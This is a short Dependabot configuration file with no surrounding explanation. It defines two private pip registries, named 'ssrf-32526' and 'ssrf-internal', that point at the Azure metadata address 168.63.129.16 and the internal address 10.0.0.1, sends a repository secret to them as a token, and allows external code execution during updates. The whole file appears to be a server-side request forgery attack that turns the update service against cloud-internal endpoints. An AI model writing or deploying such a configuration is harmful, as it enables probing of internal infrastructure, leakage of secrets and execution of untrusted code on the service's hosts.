version: 2
registries:
  ssrf-32526:
    type: python-index
    url: http://168.63.129.16:32526/#
    token: ${{ secrets.SSRF_TOKEN }}
  ssrf-internal:
    type: python-index
    url: http://10.0.0.1/#
    token: ${{ secrets.SSRF_TOKEN }}
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    insecure-external-code-execution: allow
    registries:
      - ssrf-32526
      - ssrf-internal
